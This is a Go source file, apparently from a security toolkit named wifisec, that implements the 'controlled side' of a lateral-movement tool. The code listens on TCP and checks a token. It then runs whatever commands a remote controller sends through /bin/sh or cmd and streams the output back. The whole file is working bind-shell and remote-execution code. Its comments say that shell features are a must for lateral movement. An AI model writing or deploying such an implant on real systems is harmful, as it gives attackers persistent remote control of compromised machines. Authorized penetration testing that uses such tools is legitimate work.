// bind.go 实现被控端：监听 TCP、完成认证后循环执行控制端下发的命令。
//
// 执行语义：
//   - Unix 经 /bin/sh -c、Windows 经 cmd /C 解释命令，与交互 shell 行为一致；
//   - stdout/stderr 实时按帧回传（长命令如 ping 不必等结束才有输出）；
//   - 单命令超时由 --timeout 控制，超时杀进程并回 GNU timeout 惯用的
//     退出码 124，控制端无需自行实现看门狗。
package lateral

import (
	"context"
	"fmt"
	"io"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/ctkqiang/wifisec/internal/utilities"
)

// Bind 是被控端实例：持有监听器与认证令牌，Serve 循环接入控制端。
type Bind struct {
	listener net.Listener
	token    string
	timeout  time.Duration
}

// frameSink 把进程输出按帧写入连接。exec.Command 的 stdout/stderr
// 两个管道会并发调用 Write，互斥锁保证帧不交错撕裂。
type frameSink struct {
	conn net.Conn
	mu   *sync.Mutex
}

// NewBind 在已就绪的监听器上构建 bind 服务。
// 监听器的创建与端口解析留给调用方，测试因此可以绑定 127.0.0.1:0。
func NewBind(listener net.Listener, token string, timeout time.Duration) *Bind {
	return &Bind{listener: listener, token: token, timeout: timeout}
}

// Serve 阻塞式接入循环：每个连接独立 goroutine 处理，
// 单个控制端断开或出错不影响 bind 继续服务后续接入。
func (bind *Bind) Serve() error {
	for {
		conn, err := bind.listener.Accept()
		if err != nil {
			return fmt.Errorf("接受连接失败：%w", err)
		}

		go bind.handleConn(conn)
	}
}

// Write 实现 io.Writer。空写入直接吞掉：管道不会产生空写入，
// 但防御性地避免它被误当成「输出结束」帧。
func (sink frameSink) Write(payload []byte) (int, error) {
	if len(payload) == 0 {
		return 0, nil
	}

	sink.mu.Lock()
	defer sink.mu.Unlock()

	return len(payload), writeFrame(sink.conn, payload)
}

// handleConn 服务单个控制端连接：认证 → 命令循环 → 清理。
// 命令帧长度为 0 表示控制端主动结束会话。
func (bind *Bind) handleConn(conn net.Conn) {
	defer conn.Close()

	if err := serverAuth(conn, bind.token); err != nil {
		utilities.Warn("横向移动认证失败（%s）：%v", conn.RemoteAddr(), err)
		return
	}

	utilities.Info("控制端已接入：%s", conn.RemoteAddr())

	for {
		command, err := readFrame(conn, MaxCommandLen)
		if err != nil {
			utilities.Info("控制端断开（%s）", conn.RemoteAddr())
			return
		}

		if len(command) == 0 {
			return
		}

		bind.execute(conn, string(command))
	}
}

// execute 运行单条命令并把输出流式回传，结束后发「空帧 + 退出码」。
// 输出结束帧在前、退出码在后，控制端据此区分输出块与结果元数据。
func (bind *Bind) execute(conn net.Conn, command string) {
	ctx, cancel := context.WithTimeout(context.Background(), bind.timeout)
	defer cancel()

	cmd := buildCommand(ctx, command)

	var (
		mu        sync.Mutex
		sink      = frameSink{conn: conn, mu: &mu}
		waitGroup sync.WaitGroup
	)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		utilities.Warn("创建 stdout 管道失败：%v", err)
		return
	}

	cmd.Stderr = sink

	if err := cmd.Start(); err != nil {
		mu.Lock()
		writeFrame(conn, fmt.Appendf(nil, "命令启动失败：%v\n", err))
		writeFrame(conn, nil)
		writeFrame(conn, []byte{127})
		mu.Unlock()
		return
	}

	waitGroup.Go(func() {
		io.Copy(sink, stdout)
	})

	waitErr := cmd.Wait()
	waitGroup.Wait()

	exitCode := 0
	if waitErr != nil {
		// GNU timeout 约定：124 表示命令因超时被终止，
		// 控制端可据此区分「命令自己失败」与「看门狗击杀」。
		if ctx.Err() == context.DeadlineExceeded {
			exitCode = 124
		} else if exitErr, ok := waitErr.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 127
		}
	}

	mu.Lock()
	defer mu.Unlock()

	writeFrame(conn, nil)
	writeFrame(conn, []byte{byte(exitCode)})
}

// buildCommand 按平台构造命令：Unix 统一经 /bin/sh -c 解释
// （管道、重定向、展开等 shell 特性对横向移动是刚需），
// Windows 走 cmd /C，语义等价。
func buildCommand(ctx context.Context, command string) *exec.Cmd {
	if utilities.GetOS() == utilities.Windows {
		return exec.CommandContext(ctx, "cmd", "/C", command)
	}

	return exec.CommandContext(ctx, "/bin/sh", "-c", command)
}
